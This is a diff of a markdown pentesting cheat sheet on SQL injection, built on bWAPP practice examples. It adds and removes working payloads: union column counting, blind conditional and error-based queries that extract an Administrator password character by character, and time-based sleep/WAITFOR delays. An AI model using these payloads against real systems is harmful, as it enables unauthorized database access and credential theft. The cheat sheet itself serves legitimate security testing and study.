@@ -6,6 +6,15 @@ mysql -u root -h ip
 
 # SQL injection
 
+## Payloads Cheat Sheet
+
+My cheat sheet shows the methods of SQL injection. To effectively apply them, you need to know and use payloads as well. Here is more than enough: 
+
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based
+* https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+## Injection types
+
 Here are 5 types of injection to look for (source: [OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection))
 
 * Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
@@ -17,8 +26,8 @@ Here are 5 types of injection to look for (source: [OWASP](https://owasp.org/www
 All examples are based on bWAPP (free pentesting practice tool) examples.
 
 ## Test for SQLi vulnerability
-* It is necessary to identify a possible SQLi entry point
-* Use of special characters can help (got from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)):
+
+* Fuzz using special characters the inputs under test:
 
 ```
 '
@@ -32,46 +41,11 @@ All examples are based on bWAPP (free pentesting practice tool) examples.
 )
 Wildcard (*)
 &apos;  # required for XML content
-
-Multiple encoding
-
-%%2727
-%25%27
-
-Merging characters
-
-`+HERP
-'||'DERP
-'+'herp
-' 'DERP
-'%20'HERP
-'%2B'HERP
-
-Logic Testing
-
-page.asp?id=1 or 1=1 -- true
-page.asp?id=1' or 1=1 -- true
-page.asp?id=1" or 1=1 -- true
-page.asp?id=1 and 1=2 -- false
-
-Weird characters
-
-Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
-transformed into U+0022 QUOTATION MARK (")
-Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
-transformed into U+0027 APOSTROPHE (')
 ```
 
+## Example of UNION based sql injection 
+This works if you get feedback from the server to your requests.
 
-## UNION based sql injection
-
-### MYSQL Comment
--- - Note the space after the double dash
-/* MYSQL Comment */
-/*! MYSQL Special SQL */
-/*!32302 10*/ Comment for MYSQL version 3.23.02
-
--- - to emphasize space
 
 1. Get number of columns
 
@@ -97,11 +71,7 @@ Other faster methods (if error messages are enabled):
 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100; -- --
 
 ```
-* Note: for oracle add FROM DUAL like so:
 
-```
-' UNION SELECT NULL FROM DUAL--
-```
 
 2. identify vulnerable columns
 
@@ -165,7 +135,19 @@ See also: https://owasp.org/www-community/attacks/Blind_SQL_Injection
 
 ### Detection of Blind SQL entry point
 
-#### TRUE/FALSE 
+#### Conditional Response
+
+```
+# returns some result
+…xyz' AND '1'='1
+
+# no result
+…xyz' AND '1'='2
+```
+If the first letter of Password is 's' then this query is going to return some Conditional Statement different from normal reponse
+`' OR SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
+
+#### Error based 
 
 ```
 1' or 1=1# returns no erroe
@@ -173,17 +155,34 @@ See also: https://owasp.org/www-community/attacks/Blind_SQL_Injection
 1' or 1=2# returns error or negative response
 ```
 
+If the first letter of Password is 's' then this query is going to return some Error
+
+`' OR (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+
 #### Time based 
+
+If time based injection is valid then for TRUE conditions certain amount of delay shall be present.
 
 ```
 ' AND sleep(15)#
+
 
 Benchmark:
 
 ' AND BENCHMARK(10000000,SHA1(1337))#
 ```
+Sometimes it will be needed to concatenate the strings to make it work. Try it if everything else fails:
 
+`|| sleep(15)--`
 
+##### Exploitation of time based BLIND SQLi
+
+1. Detect it time based sqli by using time delays:
+
+`'; IF (1=1) WAITFOR DELAY '0:0:10'--` shall cause a time delay
+
+If it doesn't work use payload cheat sheets mentioned above to identify correct datase type.
 
 
 # Get shell from sql-injection
